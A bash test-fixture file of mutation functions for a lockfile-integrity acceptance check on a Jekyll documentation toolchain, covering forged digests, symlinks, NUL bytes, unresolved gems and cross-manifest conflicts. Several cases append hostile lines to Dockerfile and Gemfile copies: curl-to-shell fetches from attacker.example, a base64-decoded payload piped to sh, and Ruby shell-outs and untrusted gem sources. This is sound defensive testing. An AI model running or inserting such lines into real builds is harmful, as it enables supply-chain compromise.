#!/usr/bin/env bash
# tests/bootstrap/locks/AUR-364/mutations.sh
#
# One function per case named in cases.tsv. Each function receives the path to
# a throwaway copy of the whole accept surface — tests/acceptance/AUR-364.sh,
# the committed .board/bootstrap/locks/docs.yml, the card's
# tests/bootstrap/locks/AUR-364/read-paths.attested seal, the card's
# tests/bootstrap/locks/AUR-364/resolved.lock resolution artifact, and the four
# real read_paths — and mutates exactly the bytes that case's name describes,
# in place. Sourced only by verify-fixtures.sh; never sourced or executed by
# tests/acceptance/AUR-364.sh, and never touching the real repository tree.
#
# Classes (the `class` column of cases.tsv):
#   structural            presence, symlink, NUL, envelope, size, seal shape.
#   resolution-structural the same discipline applied to the resolution
#                         artifact, whose ABSENCE must be a typed failure.
#   property-R            the heart of round 4. Every case here is a
#                         dependency that a resolved lockfile does NOT resolve,
#                         run through the FULL honest flow (--generate AND
#                         --attest). Under r3 these were classified by a
#                         syntax heuristic over the constraint and several of
#                         them passed; here no constraint is read at all.
#   set-not-count         the r3 blind reviews' blocker B4: coverage checks
#                         that compared CARDINALITY. Each case preserves the
#                         count and breaks the set.
#   empty-set-control     Lei 12 item 4: an empty derived set must FAIL. These
#                         are POSITIVE controls — if any of them ever returns
#                         pass, the whole design is vacuous.
#   grammar-adversarial   five-plus hostile forms against the ONE extraction
#                         this card still performs (the Bundler dependency
#                         production). Unknown syntax must be rejected, never
#                         skipped.
#   blind-verb-attack     install verbs that no list in this card enumerates.
#                         None of them is recognised — and none of them needs
#                         to be: they change a document read_path's bytes.
#   prior-round-blocker   blockers of the previous rounds, re-executed.
#   card-skeptical-mutation  MUT-001/002/003 as the card names them.
#   spec-read-path        round 5, Lei 20: docs/specs/AUR-364.md is a declared
#                         path, so it must be a READ path. These cases remove,
#                         symlink, empty, tamper and desynchronise it, plus the
#                         symmetric direction (a fail code added to the accept
#                         and never documented). If any of them returned pass,
#                         the path would be declared and unread again.
#   fixture-read-path     round 5, Lei 20 at FILE granularity. The card's
#                         fourth declared path is the DIRECTORY
#                         tests/bootstrap/locks/AUR-364, and until round 5 only
#                         two of the files in it were ever opened: cases.tsv,
#                         mutations.sh and verify-fixtures.sh could be deleted
#                         or rewritten with the accept still green. These cases
#                         remove each of them, tamper with them, symlink one,
#                         empty one, and add an unblessed file to the directory.
#   disclosed-limit       a case that PASSES on purpose, documenting the exact
#                         boundary of what this card proves.
set -uo pipefail

LOCK='.board/bootstrap/locks/docs.yml'
ATTEST='tests/bootstrap/locks/AUR-364/read-paths.attested'
RESOLVED='tests/bootstrap/locks/AUR-364/resolved.lock'
SPEC='docs/specs/AUR-364.md'
ACCEPT='tests/acceptance/AUR-364.sh'
FIXDIR='tests/bootstrap/locks/AUR-364'
CASES="$FIXDIR/cases.tsv"
MUTATIONS="$FIXDIR/mutations.sh"
VERIFIER="$FIXDIR/verify-fixtures.sh"
GEMFILE='Gemfile'
AGEMFILE='.aurumcode/Gemfile'
DOCKERFILE='.docker/docs.Dockerfile'
WORKFLOW='.github/workflows/documentation.yml'
TAB=$'\t'

# Regenerate the lock exactly the way docs/specs/AUR-364.md recommends. Does
# NOT touch the seal and does NOT touch the resolution: that is the whole
# point of the three-artifact design.
#
# ORDER, since round 5: `reseal` runs BEFORE `regen`. The lock now seals every
# file of the card's declared fixture directory, and read-paths.attested is one
# of them, so a lock generated before the reseal carries the digest of a seal
# that no longer exists and fails with docs-tool-unlocked. That is not a
# workaround: it is the correct blessing order, and §7 of the spec states it.
regen() { "$1/tests/acceptance/AUR-364.sh" --generate > "$1/$LOCK" 2>/dev/null || true; }
# Deliberate second action: reseal the read_paths.
reseal() { "$1/tests/acceptance/AUR-364.sh" --attest > "$1/$ATTEST" 2>/dev/null || true; }

# Insert a raw line into the resolution artifact, just before its terminator.
# `sed` is avoided for these: the records are TAB-separated and a shell that
# mangles the tab would silently produce a different mutation than the one the
# case name promises.
res_insert() {
  local dir="$1" line="$2"
  awk -v ins="$line" '/^end: bootstrap-resolution-v1$/ { print ins } { print }' \
    "$dir/$RESOLVED" > "$dir/$RESOLVED.new"
  mv "$dir/$RESOLVED.new" "$dir/$RESOLVED"
}

# Replace field <n> (1-based) of the resolution record whose name field equals
# <name> and whose manifest field equals <manifest>.
res_set_field() {
  local dir="$1" manifest="$2" name="$3" field="$4" value="$5"
  awk -F'\t' -v OFS='\t' -v m="$manifest" -v n="$name" -v f="$field" -v v="$value" '
    $1 == "gem" && $2 == m && $3 == n { $f = v }
    { print }
  ' "$dir/$RESOLVED" > "$dir/$RESOLVED.new"
  mv "$dir/$RESOLVED.new" "$dir/$RESOLVED"
}

res_drop() {
  local dir="$1" manifest="$2" name="$3"
  awk -F'\t' -v m="$manifest" -v n="$name" '
    !($1 == "gem" && $2 == m && $3 == n) { print }
  ' "$dir/$RESOLVED" > "$dir/$RESOLVED.new"
  mv "$dir/$RESOLVED.new" "$dir/$RESOLVED"
}

mut_nominal() { :; }

# --- structural -------------------------------------------------------------

mut_lock_absent() { rm -f "$1/$LOCK"; }

mut_lock_symlink() { rm -f "$1/$LOCK"; ln -s /etc/hostname "$1/$LOCK"; }

mut_lock_empty() { : > "$1/$LOCK"; }

mut_lock_generic_minimal() {
  printf 'schema: bootstrap-lock-v5\ncard: AUR-364\n' > "$1/$LOCK"
}

mut_lock_over_limit() {
  { cat "$1/$LOCK"
    for i in $(seq 1 2000); do
      echo "padding[$i].value: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    done
  } > "$1/$LOCK.new"
  mv "$1/$LOCK.new" "$1/$LOCK"
}

mut_lock_tamper_one_hex_digit() {
  sed -i 's/^read_path\[1\]\.sha256: sha256:a189/read_path[1].sha256: sha256:a180/' "$1/$LOCK"
}

# A line that is NOT `key: value` at all. The shape check that rejects it used
# to be written `grep -v ... "$lock" | grep -q .`, which under `set -o pipefail`
# reports "clean" whenever the left-hand grep is killed by SIGPIPE — a check
# that intermittently did not happen. It is now a single `grep -vq`.
mut_lock_nonconforming_line() {
  printf '>>> this line has no key and no colon-space <<<\n' >> "$1/$LOCK"
}

mut_lock_trailing_junk_line() {
  printf 'trailing[1].note: this line was never generated\n' >> "$1/$LOCK"
}

mut_lock_readpath_digest_forged() {
  sed -i 's/^read_path\[3\]\.sha256: .*/read_path[3].sha256: sha256:1111111111111111111111111111111111111111111111111111111111111111/' "$1/$LOCK"
}

mut_readpath_symlink_manifest() {
  rm -f "$1/$GEMFILE"
  ln -s .aurumcode/Gemfile "$1/$GEMFILE"
}

mut_readpath_symlink_document() {
  rm -f "$1/$DOCKERFILE"
  ln -s ../Gemfile "$1/$DOCKERFILE"
}

mut_readpath_absent() { rm -f "$1/$WORKFLOW"; }

mut_readpath_empty() { : > "$1/$GEMFILE"; }

# Lei 15: a NUL byte is invisible to BusyBox awk/grep and to bash `read`.
# It must be caught by byte accounting, not by a text scan.
mut_readpath_nul_byte() {
  printf 'gem "smuggled-by-nul", "1.0.0"' >> "$1/$AGEMFILE"
  printf 'N' | tr 'N' '\000' >> "$1/$AGEMFILE"
  printf '\n' >> "$1/$AGEMFILE"
}

mut_attest_absent() { rm -f "$1/$ATTEST"; }

mut_attest_symlink() { rm -f "$1/$ATTEST"; ln -s /etc/hostname "$1/$ATTEST"; }

# --- resolution-structural ---------------------------------------------------
# Lei 12: the required resolution source is never allowed to be missing
# quietly. Every one of these must produce a TYPED code.

mut_resolution_absent() { rm -f "$1/$RESOLVED"; }

mut_resolution_symlink() { rm -f "$1/$RESOLVED"; ln -s /etc/hostname "$1/$RESOLVED"; }

mut_resolution_empty() { : > "$1/$RESOLVED"; }

mut_resolution_over_limit() {
  { cat "$1/$RESOLVED"
    for i in $(seq 1 400); do
      printf 'gem\tGemfile\tpadding-%d\t1.0.0\tsha256:%064d\n' "$i" "$i"
    done
  } > "$1/$RESOLVED.new"
  mv "$1/$RESOLVED.new" "$1/$RESOLVED"
}

mut_resolution_nul_byte() {
  printf 'N' | tr 'N' '\000' >> "$1/$RESOLVED"
  printf '\n' >> "$1/$RESOLVED"
}

mut_resolution_schema_unknown() {
  sed -i 's/^resolution-schema: .*/resolution-schema: bootstrap-resolution-v2/' "$1/$RESOLVED"
}

mut_resolution_digest_domain_unknown() {
  sed -i 's/^digest-domain: .*/digest-domain: whatever-the-attacker-likes/' "$1/$RESOLVED"
}

mut_resolution_terminator_removed() {
  grep -v '^end: bootstrap-resolution-v1$' "$1/$RESOLVED" > "$1/$RESOLVED.new"
  mv "$1/$RESOLVED.new" "$1/$RESOLVED"
}

mut_resolution_grammar_violation() {
  res_insert "$1" 'install pagefind from wherever'
}

mut_resolution_duplicate_record() {
  res_insert "$1" "gem${TAB}Gemfile${TAB}jekyll${TAB}4.3.3${TAB}sha256:c7721ce51837898e2a961a28588e2ea6bde03a5170eb0b2779a3663101a23d23"
}

# --- property-R: the round-4 core -------------------------------------------
# Each of these adds a dependency the resolution does not resolve, then runs
# BOTH deliberate blessing actions (--generate and --attest). Under r3, a1/a2
# were labelled `pinned: true / pinned-lockable` and a3 was labelled
# `unpinned-must-not-install` and all three PASSED. Here the constraint is
# never read: what fails is the missing (manifest, name) resolution record.

mut_propR_trivial_lower_bound_zero() {
  printf "gem 'evil-supply-chain-tool', '0'\n" >> "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

mut_propR_open_lower_bound() {
  printf "gem 'evil-tool2', '>= 0'\n" >> "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

mut_propR_pessimistic_zero() {
  printf "gem 'evil-tool3', '~> 0'\n" >> "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

mut_propR_negated_constraint() {
  printf "gem 'evil-tool4', '!= 9.9.9'\n" >> "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

mut_propR_no_version_at_all() {
  printf '\ngem "evil-unpinned-tool"\n' >> "$1/$AGEMFILE"
  reseal "$1"; regen "$1"
}

# Blind review A, achado 2 (B2): under r3, `pinned` was computed from the
# constraints of EVERY manifest citing the name, so pinning the name in one
# manifest laundered the version-less declaration in the other. Here the
# resolution is keyed on the PAIR, so resolving it for .aurumcode/Gemfile does
# nothing for the root Gemfile.
mut_propR_cross_manifest_laundering() {
  printf "gem 'evil-supply-chain-tool'\n" >> "$1/$GEMFILE"
  printf '\ngem "evil-supply-chain-tool", "0.0.1"\n' >> "$1/$AGEMFILE"
  res_insert "$1" "gem${TAB}.aurumcode/Gemfile${TAB}evil-supply-chain-tool${TAB}0.0.1${TAB}sha256:1111111111111111111111111111111111111111111111111111111111111111"
  reseal "$1"; regen "$1"
}

# The same laundering in the OTHER direction: the root Gemfile already
# declares three gems with NO version at all (jekyll-seo-tag, jekyll-sitemap,
# webrick). r3 shipped them labelled pinned:true because .aurumcode/Gemfile
# pins them. Drop the ROOT record only and the pair must fail.
mut_propR_committed_unversioned_pair_unresolved() {
  res_drop "$1" 'Gemfile' 'webrick'
}

mut_propR_resolution_dead_weight() {
  res_insert "$1" "gem${TAB}Gemfile${TAB}nothing-declares-me${TAB}1.0.0${TAB}sha256:2222222222222222222222222222222222222222222222222222222222222222"
}

# These three target `wdm`, which is declared by exactly ONE manifest, so the
# only property they can break is "the resolved version is an exact release".
# Targeting a name declared by both manifests would ALSO trip the
# resolved-version-conflict rule and the case would stop proving what its name
# says it proves.
mut_propR_resolved_version_not_exact() {
  res_set_field "$1" '.aurumcode/Gemfile' 'wdm' 4 'latest'
}

mut_propR_resolved_version_two_components() {
  res_set_field "$1" '.aurumcode/Gemfile' 'wdm' 4 '0.1'
}

mut_propR_resolved_version_is_a_range() {
  res_set_field "$1" '.aurumcode/Gemfile' 'wdm' 4 '>= 0.1.1'
}

mut_propR_digest_malformed() {
  res_set_field "$1" 'Gemfile' 'jekyll' 5 'sha256:not-a-digest'
}

mut_propR_digest_null() {
  res_set_field "$1" 'Gemfile' 'jekyll' 5 "sha256:$(printf '0%.0s' $(seq 1 64))"
}

# Round 4 hardening: TAB is IFS whitespace, so `IFS=$'\t' read` folds runs of
# it. A record with a doubled TAB must be REJECTED, not silently normalised
# into a well-formed one.
# Both of these ADD a malformed row rather than replacing a valid one, so the
# ONLY property they can break is "the row is outside the grammar". Replacing a
# valid row would also strand a declaration and the case would stop proving
# what its name says it proves.
mut_resolution_tab_doubled_field() {
  res_insert "$1" "gem${TAB}${TAB}Gemfile${TAB}doubled-tab-tool${TAB}1.0.0${TAB}sha256:1212121212121212121212121212121212121212121212121212121212121212"
}

mut_resolution_empty_middle_field() {
  res_insert "$1" "gem${TAB}Gemfile${TAB}${TAB}1.0.0${TAB}sha256:1313131313131313131313131313131313131313131313131313131313131313"
}

# Two DIFFERENT artifacts claiming one identity: the "I reused a digest I
# already had" forgery.
mut_propR_digest_collision() {
  res_set_field "$1" 'Gemfile' 'just-the-docs' 5 'sha256:c7721ce51837898e2a961a28588e2ea6bde03a5170eb0b2779a3663101a23d23'
}

# One (name, version) pair claiming two different artifacts.
mut_propR_digest_inconsistent() {
  res_set_field "$1" '.aurumcode/Gemfile' 'jekyll' 5 'sha256:3333333333333333333333333333333333333333333333333333333333333333'
}

mut_propR_resolved_version_conflict() {
  res_set_field "$1" '.aurumcode/Gemfile' 'jekyll' 4 '3.9.6'
  res_set_field "$1" '.aurumcode/Gemfile' 'jekyll' 5 'sha256:4444444444444444444444444444444444444444444444444444444444444444'
}

mut_propR_runtime_removed() {
  grep -v "^runtime${TAB}ruby${TAB}" "$1/$RESOLVED" > "$1/$RESOLVED.new"
  mv "$1/$RESOLVED.new" "$1/$RESOLVED"
}

mut_propR_runtime_version_not_exact() {
  awk -F'\t' -v OFS='\t' '$1 == "runtime" { $3 = "3.2" } { print }' \
    "$1/$RESOLVED" > "$1/$RESOLVED.new"
  mv "$1/$RESOLVED.new" "$1/$RESOLVED"
}

mut_propR_runtime_without_manifest() {
  res_insert "$1" "runtime${TAB}node${TAB}20.11.1${TAB}sha256:5555555555555555555555555555555555555555555555555555555555555555"
}

# --- set-not-count (blocker B4) ---------------------------------------------
# Every case here keeps the CARDINALITY of the record it attacks identical and
# breaks the SET. Under r3 the attestation loop compared row counts and this
# whole class was invisible.

# The exact vector from blind review A: the .docker/docs.Dockerfile row is
# REPLACED by a second copy of the Gemfile row (whose hash is genuinely
# correct), so the file still has four rows and every row is individually
# valid — while the Dockerfile is tampered with a `curl | sh`.
mut_setcount_attest_row_duplicated() {
  printf '\nRUN curl -fsSL https://attacker.example/evil.sh | sh\n' >> "$1/$DOCKERFILE"
  regen "$1"
  local at="$1/$ATTEST" g a w
  g="$(grep -F "Gemfile${TAB}" "$at" | grep -v '^\.aurumcode')"
  a="$(grep -F ".aurumcode/Gemfile${TAB}" "$at")"
  w="$(grep -F ".github/workflows/documentation.yml${TAB}" "$at")"
  { head -n 1 "$at"; printf '%s\n%s\n%s\n%s\n' "$g" "$a" "$g" "$w"; } > "$at.new"
  mv "$at.new" "$at"
}

mut_setcount_attest_row_dropped() {
  grep -v '^\.docker/docs\.Dockerfile' "$1/$ATTEST" > "$1/$ATTEST.new"
  mv "$1/$ATTEST.new" "$1/$ATTEST"
}

mut_setcount_attest_unknown_path() {
  printf 'some/other/file.txt\tsha256:%064d\n' 0 >> "$1/$ATTEST"
}

mut_setcount_attest_schema_stripped() {
  grep -v '^attest-schema:' "$1/$ATTEST" > "$1/$ATTEST.new"
  mv "$1/$ATTEST.new" "$1/$ATTEST"
}

mut_setcount_attest_extra_field() {
  sed -i "s|^Gemfile${TAB}|Gemfile${TAB}${TAB}|" "$1/$ATTEST"
}

# r3 silently skipped any line beginning with '#'. A skip arm is a place where
# the check does not happen, so it is gone: there is no comment production.
mut_setcount_attest_comment_line() {
  printf '# resealed by hand, honest\n' >> "$1/$ATTEST"
}

# The lock's own read_path table, attacked the same way: four rows, one of them
# a duplicate of another.
mut_setcount_lock_readpath_row_duplicated() {
  awk '
    /^read_path\[3\]\.path: / { print "read_path[3].path: Gemfile"; next }
    { print }
  ' "$1/$LOCK" > "$1/$LOCK.new"
  mv "$1/$LOCK.new" "$1/$LOCK"
}

# The lock's tool table, attacked the same way: the entry count is preserved
# and one entry is a duplicate of another (manifest, name) pair.
mut_setcount_lock_tool_entry_duplicated() {
  awk '
    /^tool\[4\]\.name: / { print "tool[4].name: jekyll"; next }
    /^tool\[4\]\.declared_in: / { print "tool[4].declared_in: Gemfile"; next }
    { print }
  ' "$1/$LOCK" > "$1/$LOCK.new"
  mv "$1/$LOCK.new" "$1/$LOCK"
}

# The lock's role table: relabel a MANIFEST as a document. Under a design that
# trusted the lock's own role field this would remove the Gemfile from the
# parse set while keeping every count intact.
mut_setcount_lock_role_manifest_to_document() {
  sed -i 's/^read_path\[1\]\.role: manifest$/read_path[1].role: document/' "$1/$LOCK"
}

# --- empty-set controls (Lei 12, item 4) ------------------------------------
# If ANY of these ever returns pass, "the two sides agreed" would mean
# "neither side found anything". They are positive controls.

mut_empty_both_manifests_honest() {
  sed -i "/^gem /d" "$1/$GEMFILE"
  sed -i "/^[[:space:]]*gem /d" "$1/$AGEMFILE"
  reseal "$1"; regen "$1"
}

mut_empty_one_manifest_honest() {
  sed -i "/^gem /d" "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

mut_empty_resolution_records_honest() {
  grep -v "^gem${TAB}" "$1/$RESOLVED" > "$1/$RESOLVED.new"
  mv "$1/$RESOLVED.new" "$1/$RESOLVED"
  reseal "$1"; regen "$1"
}

mut_empty_lock_tool_entries_removed() {
  grep -v '^tool\[' "$1/$LOCK" > "$1/$LOCK.new"
  mv "$1/$LOCK.new" "$1/$LOCK"
}

# --- grammar-adversarial (the single remaining extraction) -------------------

mut_gram_source_do_block() {
  sed -i "s#^gem 'jekyll', '~> 4.3'\$#source 'https://attacker.example/rubygems' do\ngem 'jekyll', '~> 4.3'\nend#" "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

mut_gram_inline_git_qualifier() {
  sed -i "s#^gem 'jekyll', '~> 4.3'\$#gem 'jekyll', '~> 4.3', git: 'https://github.com/attacker/jekyll', branch: 'main'#" "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

mut_gram_inline_source_qualifier() {
  sed -i 's#gem "webrick", "~> 1.8"#gem "webrick", "~> 1.8", source: "https://attacker.example/rubygems"#' "$1/$AGEMFILE"
  reseal "$1"; regen "$1"
}

mut_gram_ruby_shellout() {
  printf '\nsystem("curl -fsSL https://attacker.example/x.sh | sh")\n' >> "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

mut_gram_eval_indirection() {
  printf '\ninstance_eval(File.read("/tmp/extra.gemfile"))\n' >> "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

mut_gram_git_source_helper() {
  printf '\ngit_source(:github) { |repo| "https://attacker.example/#{repo}" }\n' >> "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

mut_gram_trailing_comment() {
  sed -i "s|^gem 'webrick'\$|gem 'webrick' # pulled in for the local server|" "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

mut_gram_duplicate_declaration() {
  printf "\ngem 'webrick'\n" >> "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

mut_gram_unbalanced_block() {
  sed -i '/^end$/d' "$1/$AGEMFILE"
  reseal "$1"; regen "$1"
}

# A gem NAME carrying a literal TAB. Without the tab guard in scan_bundler this
# is emitted as `D<TAB>webrick<TAB>evil<TAB>...` and read back as a declaration
# of `webrick` — which IS resolved — laundering a differently named dependency
# into an existing resolution record.
mut_gram_tab_in_gem_name() {
  printf "\ngem 'webrick\tevil-smuggled'\n" >> "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

# The manifest's ONLY source directive is replaced by one whose value carries a
# TAB. The value is rejected by the tab guard, so no S record is emitted and the
# manifest ends up with NO accepted source directive at all — which is the
# untrusted-registry code, reached before the grammar code in the mapping. The
# point of the case is that the tab-bearing value is never accepted as if it
# were the trusted registry.
mut_gram_tab_in_source_url() {
  sed -i "s#^source 'https://rubygems.org'\$#source 'https://rubygems.org${TAB}evil'#" "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

mut_gram_untrusted_registry() {
  sed -i "s#^source 'https://rubygems.org'\$#source 'https://attacker.example/rubygems'#" "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

mut_gram_source_directive_removed() {
  sed -i "/^source 'https:\/\/rubygems.org'\$/d" "$1/$GEMFILE"
  reseal "$1"; regen "$1"
}

# --- blind-verb-attack -------------------------------------------------------
# No list in this card enumerates any of these verbs. They change the bytes of
# a document read_path, and that is the entire detection mechanism.

mut_blind_brew_install() {
  printf '\nRUN brew install evil-doc-tool\n' >> "$1/$DOCKERFILE"
}

mut_blind_brew_install_honest_regen() {
  printf '\nRUN brew install evil-doc-tool\n' >> "$1/$DOCKERFILE"
  regen "$1"
}

mut_blind_cargo_install() {
  printf '\nRUN cargo install evil-doc-tool --version 6.6.6\n' >> "$1/$DOCKERFILE"
  regen "$1"
}

mut_blind_apk_add() {
  printf '\nRUN apk add --no-cache evil-doc-tool\n' >> "$1/$DOCKERFILE"
  regen "$1"
}

mut_blind_dpkg_arbitrary_deb() {
  printf '\nRUN dpkg -i /tmp/evil-doc-tool.deb\n' >> "$1/$DOCKERFILE"
  regen "$1"
}

mut_blind_pipx_install() {
  printf '\nRUN pipx install evil-pipx-tool\n' >> "$1/$DOCKERFILE"
  regen "$1"
}

mut_blind_curl_pipe_bash() {
  printf '\nRUN curl -fsSL https://attacker.example/install-evil-tool.sh | bash\n' >> "$1/$DOCKERFILE"
  regen "$1"
}

mut_blind_base64_decoded_payload() {
  printf '\nRUN echo Y3VybCBldmlsIHwgc2gK | base64 -d | sh\n' >> "$1/$DOCKERFILE"
  regen "$1"
}

mut_blind_workflow_new_install_step() {
  printf '\n      - name: extra tooling\n        run: gem install some-new-doc-gem\n' >> "$1/$WORKFLOW"
  regen "$1"
}

mut_blind_pipx_full_reseal() {
  # DISCLOSED LIMIT, expected to PASS: both deliberate artifacts updated. The
  # change is no longer invisible — cases.tsv also requires the lock sha to
  # move — but this card does not classify what a documentation command does.
  printf '\nRUN pipx install evil-pipx-tool\n' >> "$1/$DOCKERFILE"
  reseal "$1"; regen "$1"
}

# --- prior-round blockers, re-executed ---------------------------------------

mut_blockerA_undeclared_gem_stale_lock() {
  printf '\ngem "evil-supply-chain-tool", "6.6.6"\n' >> "$1/$AGEMFILE"
}

mut_blockerA_undeclared_gem_honest_regenerate() {
  printf '\ngem "evil-supply-chain-tool", "6.6.6"\n' >> "$1/$AGEMFILE"
  regen "$1"
}

mut_blockerB_jekyll_git_branch_qualifier() {
  sed -i "s#^gem 'jekyll', '~> 4.3'\$#gem 'jekyll', '~> 4.3', git: 'https://github.com/attacker/jekyll', branch: 'main'#" "$1/$GEMFILE"
  regen "$1"
}

mut_blockerB_webrick_source_qualifier() {
  sed -i 's#gem "webrick", "~> 1.8"#gem "webrick", "~> 1.8", source: "https://attacker.example/rubygems"#' "$1/$AGEMFILE"
  regen "$1"
}

# The full r3 blessing flow that blind review B used to smuggle a version-less
# gem past AC-001: manifest edit + --generate + --attest, all three honest.
mut_blockerR3_full_honest_flow_unpinned() {
  printf '\ngem "evil-unpinned-tool"\n' >> "$1/$AGEMFILE"
  reseal "$1"; regen "$1"
}

# The r3 blessing flow that DOES work, and must: manifest edit, a hand-written
# resolution record with an exact version and a distinct digest, --generate and
# --attest. Three deliberate, separately reviewable actions.
mut_disclosed_new_gem_fully_resolved() {
  printf '\ngem "evil-supply-chain-tool", "6.6.6"\n' >> "$1/$AGEMFILE"
  res_insert "$1" "gem${TAB}.aurumcode/Gemfile${TAB}evil-supply-chain-tool${TAB}6.6.6${TAB}sha256:6666666666666666666666666666666666666666666666666666666666666666"
  reseal "$1"; regen "$1"
}

# --- card skeptical mutations -----------------------------------------------

mut_mut001_workflow_no_lock_update() {
  printf '\n      - name: extra doc step\n        run: echo "unrelated new documentation command"\n' >> "$1/$WORKFLOW"
}

# MUT-002 as the card words it AFTER round 5: two manifests declare the same
# tool NAME and the resolution gives them DIFFERENT versions. The function name
# now describes the branch it actually exercises — cross-manifest resolution
# conflict — instead of promising a jekyll-versus-ruby compatibility judgement
# that no branch of this card performs (see the disclosed-limit case below and
# limits[6] of the generated lock).
mut_mut002_cross_manifest_resolution_conflict() {
  res_set_field "$1" '.aurumcode/Gemfile' 'jekyll' 4 '3.9.6'
  res_set_field "$1" '.aurumcode/Gemfile' 'jekyll' 5 'sha256:7777777777777777777777777777777777777777777777777777777777777777'
  reseal "$1"; regen "$1"
}

mut_mut002b_ruby_runtime_unresolved() {
  grep -v "^runtime${TAB}ruby${TAB}" "$1/$RESOLVED" > "$1/$RESOLVED.new"
  mv "$1/$RESOLVED.new" "$1/$RESOLVED"
  reseal "$1"; regen "$1"
}

# MUT-003 as the card words it: "permitir instalação de Pagefind sem
# versão/digest". The declaration is added AND a resolution record is added
# that carries neither an exact version nor a real digest.
mut_mut003_pagefind_without_version_or_digest() {
  printf '\ngem "pagefind"\n' >> "$1/$AGEMFILE"
  res_insert "$1" "gem${TAB}.aurumcode/Gemfile${TAB}pagefind${TAB}latest${TAB}sha256:$(printf '0%.0s' $(seq 1 64))"
  reseal "$1"; regen "$1"
}

# The same intent with NO resolution record at all: the typed code differs
# (incomplete rather than mutable) and neither is a pass.
mut_mut003b_pagefind_without_resolution() {
  printf '\ngem "pagefind"\n' >> "$1/$AGEMFILE"
  reseal "$1"; regen "$1"
}

mut_mut003c_lock_resolved_version_forged() {
  sed -i 's/^tool\[3\]\.resolved_version: .*/tool[3].resolved_version: 9.9.9/' "$1/$LOCK"
}

mut_mut003d_lock_artifact_digest_forged() {
  sed -i 's/^tool\[3\]\.artifact_digest: .*/tool[3].artifact_digest: sha256:8888888888888888888888888888888888888888888888888888888888888888/' "$1/$LOCK"
}

mut_mut003e_lock_fabricated_extra_tool() {
  awk '
    /^count\.read_paths: / {
      print "tool[99].name: pagefind"
      print "tool[99].declared_in: .aurumcode/Gemfile"
      print "tool[99].runtime: ruby"
      print "tool[99].manifest_format: bundler"
      print "tool[99].version_constraint: 1.0.0"
      print "tool[99].constraint_interpreted: false"
      print "tool[99].resolved_version: 1.0.0"
      print "tool[99].artifact_digest: sha256:4141414141414141414141414141414141414141414141414141414141414141"
      print "tool[99].runtime_version: 3.2.2"
      print "tool[99].declaration_sha256: sha256:4141414141414141414141414141414141414141414141414141414141414141"
      print "tool[99].manifest_sha256: sha256:4141414141414141414141414141414141414141414141414141414141414141"
      print "tool[99].allowlisted_command: n/a"
      print "tool[99].output_schema: n/a"
    }
    { print }
  ' "$1/$LOCK" > "$1/$LOCK.new"
  mv "$1/$LOCK.new" "$1/$LOCK"
}

mut_lock_tool_renamed() {
  sed -i 's/^tool\[3\]\.name: jekyll$/tool[3].name: JEKYLL/' "$1/$LOCK"
}

mut_lock_tool_declared_in_swapped() {
  sed -i 's|^tool\[3\]\.declared_in: Gemfile$|tool[3].declared_in: .aurumcode/Gemfile|' "$1/$LOCK"
}

mut_lock_tool_field_stripped() {
  grep -v '^tool\[3\]\.artifact_digest: ' "$1/$LOCK" > "$1/$LOCK.new"
  mv "$1/$LOCK.new" "$1/$LOCK"
}

mut_lock_resolution_sha_forged() {
  sed -i 's/^resolution\.sha256: .*/resolution.sha256: sha256:9999999999999999999999999999999999999999999999999999999999999999/' "$1/$LOCK"
}

mut_lock_spec_sha_forged() {
  sed -i 's/^spec\.sha256: .*/spec.sha256: sha256:5555555555555555555555555555555555555555555555555555555555555555/' "$1/$LOCK"
}

# --- the spec document as a READ path (Lei 20) -------------------------------
# Until round 5 docs/specs/AUR-364.md was a declared path that no branch of the
# accept ever opened: removing it left the oracle green while the card kept
# asserting in writing what the file said. These cases are the proof that the
# path is now read, and read for something that matters — a check that passes
# by absence is exactly the class this card is under indictment for.

mut_spec_absent() { rm -f "$1/$SPEC"; }

mut_spec_symlink() {
  rm -f "$1/$SPEC"
  ln -s /etc/hostname "$1/$SPEC"
}

mut_spec_empty() { : > "$1/$SPEC"; }

# Prose edited without a deliberate --generate: the SET of documented codes is
# untouched, so this can only be caught by the digest the lock seals.
mut_spec_prose_tampered() {
  printf '\nUma frase acrescentada sem reselo deliberado.\n' >> "$1/$SPEC"
}

# The other inclusion, and the one that matters: a code REMOVED from the spec's
# section 5 table, with the lock regenerated so the digest agrees. Only the set
# comparison can catch this.
mut_spec_code_row_removed() {
  grep -v '^| `docs-tool-source-untrusted` |' "$1/$SPEC" > "$1/$SPEC.new"
  mv "$1/$SPEC.new" "$1/$SPEC"
  reseal "$1"; regen "$1"
}

# ...and a code DOCUMENTED that no branch can reach.
mut_spec_code_row_fabricated() {
  awk '
    /^\| `docs-tool-source-untrusted` \|/ {
      print "| `fabricated-code-no-branch-emits` | inventado, nenhum ramo emite |"
    }
    { print }
  ' "$1/$SPEC" > "$1/$SPEC.new"
  mv "$1/$SPEC.new" "$1/$SPEC"
  reseal "$1"; regen "$1"
}

# The symmetric direction: a new fail site added to the accept script and never
# documented. The derivation reads the script's own bytes, so this is visible
# without any list being maintained anywhere.
mut_script_fail_code_undocumented() {
  awk '
    /^# --- 4\. the REQUIRED RESOLUTION SOURCE/ {
      print "if [[ -n \"${AURUM_NEVER_SET:-}\" ]]; then fail undocumented-new-code; fi"
    }
    { print }
  ' "$1/$ACCEPT" > "$1/$ACCEPT.new"
  mv "$1/$ACCEPT.new" "$1/$ACCEPT"
  chmod +x "$1/$ACCEPT"
}

# --- the disclosed limit this card stopped pretending to cover ---------------
# limits[6]. The resolved runtime is dropped to ruby 2.0.0 while jekyll stays at
# 4.3.3 — a pair that is genuinely incompatible in the real world (jekyll
# 4.3.3's gemspec requires ruby >= 2.5.0) — WITHOUT introducing any
# cross-manifest conflict. It PASSES, on purpose, because this card performs no
